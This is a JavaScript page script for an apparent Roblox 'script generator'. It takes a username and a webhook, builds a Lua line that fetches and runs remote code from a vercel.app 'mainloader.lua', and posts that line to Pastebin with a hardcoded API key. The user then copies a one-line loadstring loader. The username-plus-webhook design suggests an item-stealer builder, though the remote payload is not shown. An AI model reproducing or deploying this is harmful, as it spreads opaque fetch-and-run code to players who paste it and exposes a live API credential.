document.addEventListener("DOMContentLoaded", function() {
  const generateButton = document.getElementById('generateBtn');
  const copyButton = document.getElementById('copyBtn');

  generateButton.addEventListener('click', async function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const webhook = document.getElementById("webhook").value;

    // Generate the script output
    const outputString = `Username = "${username}"\n` +
                         `Webhook = "${webhook}"\n\n` +
                         `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mainloader.lua", true))()`;

    // Pastebin API key
    const apiKey = 'fw1TP2aocJeX4p3DnYmXs23OiKS4LdTu'; // Your Pastebin API key

    // Prepare data for the API request
    const pasteData = new URLSearchParams();
    pasteData.append('api_dev_key', apiKey);
    pasteData.append('api_option', 'paste');
    pasteData.append('api_paste_code', outputString);
    pasteData.append('api_option_expire', 'N'); // Set to 'N' for non-expiring
    pasteData.append('api_option_private', '1'); // Set to '1' for private

    // Upload to Pastebin
    try {
      const response = await fetch('https://pastebin.com/api/api_post', {
        method: 'POST',
        body: pasteData,
      });

      const data = await response.text();
      if (response.ok) {
        // Extract the Pastebin link
        const pastebinLink = data.match(/(?:https?:\/\/)?(?:www\.)?(pastebin\.com\/[A-Za-z0-9]+)/)[0];
        document.getElementById("output").value = `loadstring(game:HttpGet("${pastebinLink}", true))()`;
      } else {
        throw new Error('Failed to upload Pastebin');
      }
    } catch (error) {
      alert(error.message);
      document.getElementById("output").value = "Failed to upload Pastebin";
    }
  });

  copyButton.addEventListener('click', function() {
    const copyText = document.getElementById("output");
    copyText.select();
    copyText.setSelectionRange(0, 99999);
    document.execCommand("copy");
    alert("Copied to clipboard!");
  });
});
